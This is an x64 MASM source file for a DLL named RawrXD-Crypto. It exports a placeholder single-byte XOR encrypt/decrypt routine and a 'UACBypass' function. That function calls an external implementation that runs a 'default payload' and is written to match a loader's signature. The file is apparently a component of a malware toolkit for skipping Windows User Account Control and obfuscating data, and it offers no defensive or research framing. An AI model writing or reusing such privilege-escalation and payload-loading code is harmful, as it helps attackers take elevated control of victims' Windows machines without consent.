; src/crypto_masm.asm
; RawrXD-Crypto.dll - Pure x64 MASM exports for lightweight crypto + UAC bypass wrapper.
;
; Exports (via .def):
;   Encrypt(const char* in, char* out, size_t size)
;   Decrypt(const char* in, char* out, size_t size)
;   UACBypass() -> bool
;
; No CRT usage.

OPTION CASEMAP:NONE
; ml64 is always x64; the WIN64 option is not needed and breaks older assemblers.

EXTERN UACBypass_Impl:PROC

.code

; DLL Entry Point (required when linking without CRT via /ENTRY:DllMain)
DllMain PROC hinstDLL:QWORD, fdwReason:DWORD, lpReserved:QWORD
    mov eax, 1  ; TRUE
    ret
DllMain ENDP

; Encrypt: void Encrypt(const char* input, char* output, size_t size)
; Simple XOR cipher with key 0xAA (placeholder).
Encrypt PROC PUBLIC
    ; rcx = input
    ; rdx = output
    ; r8  = size
    test r8, r8
    jz short encrypt_done

    mov r9, rcx
    mov r10, rdx
    mov r11, r8
    xor rax, rax

encrypt_loop:
    mov cl, byte ptr [r9 + rax]
    xor cl, 0AAh
    mov byte ptr [r10 + rax], cl
    inc rax
    cmp rax, r11
    jl short encrypt_loop

encrypt_done:
    ret
Encrypt ENDP

; Decrypt is symmetric for XOR.
Decrypt PROC PUBLIC
    jmp Encrypt
Decrypt ENDP

; UACBypass: bool UACBypass()
; Wrapper to match the loader signature (no args). Uses default payload.
UACBypass PROC PUBLIC
    xor rcx, rcx            ; payloadPath = NULL -> default inside UACBypass_Impl
    call UACBypass_Impl
    ret
UACBypass ENDP

END
